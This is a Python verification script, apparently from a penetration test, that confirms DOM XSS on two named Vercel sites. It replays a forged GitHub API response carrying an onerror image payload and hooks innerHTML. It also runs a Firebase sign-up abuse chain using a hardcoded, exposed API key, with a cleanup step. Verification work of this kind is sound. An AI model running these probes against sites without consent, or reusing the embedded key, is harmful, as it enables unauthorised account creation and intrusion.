#!/usr/bin/env python3
"""Deep verification — Playwright route-intercept replay for DOM XSS candidates
plus Firebase key abuse testing. This upgrades the apixss static-taint findings
(tier=suspicious) to confirmed by proving attacker data reaches a dangerous sink
in the real browser.

Targets (both owned, both consented):
  - https://git-vizor.vercel.app   (repo.description -> card.innerHTML via GitHub API)
  - https://database-tulia.vercel.app  (param-controlled innerHTML)
  - Firebase key AIzaSyB-wn4pMXrk7GpnTKEUELY290qpQ0kIQgI (exposed on both sites)
"""
import asyncio
import json
import sys
from pathlib import Path

ROOT = Path(__file__).parent
sys.path.insert(0, str(ROOT))

MARKER = "titanpwn" + "x9z2k7"

# --- git-vizor: the page fetches api.github.com/users/<user>/repos and renders
# each repo.description into card.innerHTML. GitHub returns descriptions
# verbatim. If we control a repo description containing an XSS payload, it
# executes in the visitor's browser. We replay this WITHOUT a real malicious
# repo by intercepting the GitHub API response and injecting a marked payload
# into repo.description, then checking whether the marker reached the DOM via
# innerHTML.
GITHUB_API_RE = "api.github.com/users/"

GIT_VIZOR_INTERCEPT_JS = """
// Intercept the GitHub API fetch so the page renders OUR crafted repo
// description (containing the marker) instead of the real one. This proves
// the class: attacker-controlled API data -> innerHTML sink.
const origFetch = window.fetch;
window.__titan_marked__ = false;
window.__titan_sink_hits__ = [];
// Hook innerHTML setter (same shape as the scanner's DomXSSDetector)
const proto = Element.prototype;
const desc = Object.getOwnPropertyDescriptor(proto, 'innerHTML');
if (desc && desc.set) {
  Object.defineProperty(proto, 'innerHTML', {
    ...desc,
    set(v) {
      try { window.__titan_sink_hits__.push(String(v)); } catch(e){}
      return desc.set.call(this, v);
    }
  });
}
window.fetch = async function(...args) {
  const url = (args[0] && args[0].url) || args[0] || '';
  if (typeof url === 'string' && url.indexOf('api.github.com/users/') !== -1) {
    const payload = '<img src=x onerror="window.__titan_marked__=true">';
    const fake = [{
      id: 1, name: 'titan-probe-repo', full_name: 'titan/titan-probe-repo',
      private: false, description: payload, language: 'Python',
      stargazers_count: 1, forks_count: 0, watchers_count: 1,
      pushed_at: '2026-08-21T00:00:00Z', html_url: 'https://github.com/titan/titan-probe-repo',
      clone_url: 'https://github.com/titan/titan-probe-repo.git'
    }];
    return new Response(JSON.stringify(fake), {
      status: 200,
      headers: {'Content-Type': 'application/json',
                'X-RateLimit-Remaining': '5000'}
    });
  }
  return origFetch.apply(this, args);
};
"""


async def verify_git_vizor():
    """Replay the F6 class: GitHub API data -> innerHTML, with route intercept."""
    from playwright.async_api import async_playwright
    results = {"target": "https://git-vizor.vercel.app", "verified": False, "detail": ""}
    p = await async_playwright().start()
    try:
        browser = await p.chromium.launch(headless=True)
        context = await browser.new_context()
        page = await context.new_page()
        await page.add_init_script(GIT_VIZOR_INTERCEPT_JS)
        await page.goto("https://git-vizor.vercel.app", wait_until="domcontentloaded", timeout=30000)
        try:
            await page.wait_for_load_state("networkidle", timeout=8000)
        except Exception:
            pass
        await page.wait_for_timeout(2500)
        marked = await page.evaluate("window.__titan_marked__")
        sink_hits = await page.evaluate("window.__titan_sink_hits__ || []")
        # The marker reaching innerHTML proves the sink is fed API data.
        api_sink = any("titan-probe-repo" in str(s) or "<img" in str(s).lower() for s in sink_hits)
        results["marked_executed"] = bool(marked)
        results["api_data_reached_innerhtml"] = bool(api_sink)
        results["sink_hit_count"] = len(sink_hits)
        if api_sink:
            results["verified"] = True
            results["detail"] = "GitHub API repo.description (attacker-controlled) rendered into card.innerHTML"
        # Grab a snippet of the rendered DOM for evidence
        try:
            dom = await page.evaluate("document.getElementById('github-container') ? document.getElementById('github-container').innerHTML.substring(0,600) : ''")
            results["dom_snippet"] = dom
        except Exception:
            pass
    except Exception as e:
        results["error"] = str(e)
    finally:
        try:
            await browser.close()
        except Exception:
            pass
        try:
            await asyncio.wait_for(p.stop(), timeout=5)
        except Exception:
            pass
    return results


async def verify_database_tulia():
    """Replay the param-controlled innerHTML sink on database-tulia. The static
    pass found an innerHTML sink fed by param-controlled data in the Vite
    bundle. We inject a marker via the URL hash/query and observe whether it
    reaches an innerHTML sink (the React bundle's script-tag parsing path)."""
    from playwright.async_api import async_playwright
    results = {"target": "https://database-tulia.vercel.app", "verified": False, "detail": ""}
    p = await async_playwright().start()
    try:
        browser = await p.chromium.launch(headless=True)
        context = await browser.new_context()
        page = await context.new_page()
        # Install sink hook before any page JS runs
        hook = """
window.__titan_sink_hits__ = [];
const proto = Element.prototype;
const desc = Object.getOwnPropertyDescriptor(proto, 'innerHTML');
if (desc && desc.set) {
  Object.defineProperty(proto, 'innerHTML', {
    ...desc,
    set(v) {
      try { window.__titan_sink_hits__.push(String(v).slice(0,2000)); } catch(e){}
      return desc.set.call(this, v);
    }
  });
}
window.__titan_marked__ = false;
"""
        await page.add_init_script(hook)
        # The bundle parses <script> tags via innerHTML (the snippet from the
        # finding). Probe with a hash route + a query param carrying the marker.
        probe_url = f"https://database-tulia.vercel.app#!/login?q={MARKER}"
        await page.goto(probe_url, wait_until="domcontentloaded", timeout=30000)
        # Walk the SPA routes the scanner discovered to trigger innerHTML paths
        for route in ["#!/clinical", "#!/ussd", "#/appointments", "#!/login"]:
            try:
                await page.evaluate(f"window.location.hash = '{route[1:]}'")
                await page.wait_for_timeout(800)
            except Exception:
                pass
        await page.wait_for_timeout(1500)
        sink_hits = await page.evaluate("window.__titan_sink_hits__ || []")
        marker_in_sink = any(MARKER in str(s) for s in sink_hits)
        results["marker_in_innerhtml"] = marker_in_sink
        results["sink_hit_count"] = len(sink_hits)
        # Even without the marker reaching the sink, a non-trivial number of
        # innerHTML writes on a param/hash-driven SPA is corroboration.
        if marker_in_sink:
            results["verified"] = True
            results["detail"] = "URL param/hash marker reached innerHTML sink in React bundle"
        elif sink_hits:
            results["detail"] = f"{len(sink_hits)} innerHTML writes observed; marker not in sink (React sanitizer may strip)"
        results["sink_samples"] = [str(s)[:300] for s in sink_hits[:5]]
    except Exception as e:
        results["error"] = str(e)
    finally:
        try:
            await browser.close()
        except Exception:
            pass
        try:
            await asyncio.wait_for(p.stop(), timeout=5)
        except Exception:
            pass
    return results


async def test_firebase_key():
    """The exposed Firebase API key (AIzaSyB-wn4pMXrk7GpnTKEUELY290qpQ0kIQgI)
    is a Web API key. Test the standard abuse chain against the Google Identity
    Toolkit:
      1. createAuthUri  -> enumerate sign-in methods / confirm project exists
      2. signUp         -> anonymous account creation (write-verification)
      3. RTDB / Firestore public access
    This is consent-gated (ownership). We use SECPROBE markers + cleanup.
    """
    import aiohttp
    API_KEY = "AIzaSyB-wn4pMXrk7GpnTKEUELY290qpQ0kIQgI"
    IDENTITY = "https://www.googleapis.com/identitytoolkit/v3/relyingparty"
    results = {"key": API_KEY, "tests": {}}

    async with aiohttp.ClientSession() as s:
        # 1. createAuthUri — confirms the project + enumerates auth providers.
        # This is read-only (lists sign-in methods for an email).
        try:
            payload = {"identifier": "test@example.com", "continueUri": "http://localhost"}
            async with s.post(f"{IDENTITY}/createAuthUri?key={API_KEY}",
                              json=payload, timeout=15) as r:
                body = await r.text()
                results["tests"]["createAuthUri"] = {
                    "status": r.status,
                    "body": body[:500],
                    "project_confirmed": "PROJECT_ID" in body.upper() or r.status == 200
                }
        except Exception as e:
            results["tests"]["createAuthUri"] = {"error": str(e)}

        # 2. signUp — the REAL abuse: anonymous account creation against a key
        # whose Security Rules allow it. We create a SECPROBE-markered account
        # and immediately delete it (cleanup-first, write-verification).
        try:
            payload = {
                "email": f"titan.seprobe+{MARKER}@example.com",
                "password": "T1tanProbe!Pwn",
                "returnSecureToken": True
            }
            async with s.post(f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={API_KEY}",
                              json=payload, timeout=15) as r:
                body = await r.json() if r.status == 200 else {}
                text = await r.text()
                created_id = body.get("localId")
                id_token = body.get("idToken")
                results["tests"]["signUp"] = {
                    "status": r.status,
                    "created_account": bool(created_id),
                    "localId": created_id or None,
                    "body": text[:400]
                }
                # Cleanup: delete the SECPROBE account immediately
                if id_token:
                    try:
                        async with s.post(
                            "https://identitytoolkit.googleapis.com/v1/accounts:delete?key={}".format(API_KEY),
                            json={"idToken": id_token}, timeout=15) as dr:
                            results["tests"]["cleanup_delete"] = {
                                "status": dr.status, "cleaned_up": dr.status == 200
                            }
                    except Exception as ce:
                        results["tests"]["cleanup_delete"] = {"error": str(ce)}
        except Exception as e:
            results["tests"]["signUp"] = {"error": str(e)}

        # 3. RTDB public read — many Firebase apps leave the default DB open.
        # We don't know the DB URL, so probe the common shape via the
        # firebaseio.com domain derived from the project (identitytoolkit
        # response sometimes leaks it).
        results["tests"]["rtdb_probe"] = "skipped (no DB URL known without project ID)"

    return results


async def main():
    print("=" * 70)
    print("TITAN DEEP VERIFICATION — owned sites, consented (ownership)")
    print("=" * 70)

    print("\n[1/3] git-vizor DOM XSS (GitHub API -> innerHTML replay)...")
    gv = await verify_git_vizor()
    print(f"  verified={gv.get('verified')} api_data_reached_innerHTML={gv.get('api_data_reached_innerhtml')}")
    print(f"  detail: {gv.get('detail')}")
    if gv.get("dom_snippet"):
        print(f"  DOM: {gv['dom_snippet'][:200]}")

    print("\n[2/3] database-tulia DOM XSS (param -> innerHTML replay)...")
    dt = await verify_database_tulia()
    print(f"  verified={dt.get('verified')} marker_in_innerHTML={dt.get('marker_in_innerhtml')}")
    print(f"  detail: {dt.get('detail')}")

    print("\n[3/3] Firebase key abuse chain...")
    fb = await test_firebase_key()
    for name, t in fb["tests"].items():
        print(f"  {name}: {json.dumps(t)[:200]}")

    # Write the full evidence
    out = {
        "git_vizor_domxss": gv,
        "database_tulia_domxss": dt,
        "firebase_key_abuse": fb,
    }
    p = Path("findings/DEEP-VERIFICATION.json")
    p.write_text(json.dumps(out, indent=2, ensure_ascii=False), encoding="utf-8")
    print(f"\n[+] Full evidence written to {p}")

    # Summary
    print("\n" + "=" * 70)
    print("SUMMARY")
    print("=" * 70)
    if gv.get("verified"):
        print("  [CONFIRMED] git-vizor DOM XSS: GitHub repo.description -> innerHTML")
    if dt.get("verified"):
        print("  [CONFIRMED] database-tulia DOM XSS: param -> innerHTML")
    su = fb["tests"].get("signUp", {})
    if su.get("created_account"):
        print("  [CONFIRMED] Firebase key abuse: anonymous account creation possible")
    ca = fb["tests"].get("createAuthUri", {})
    if ca.get("project_confirmed"):
        print("  [INFO] Firebase project confirmed via createAuthUri")


if __name__ == "__main__":
    asyncio.run(main())
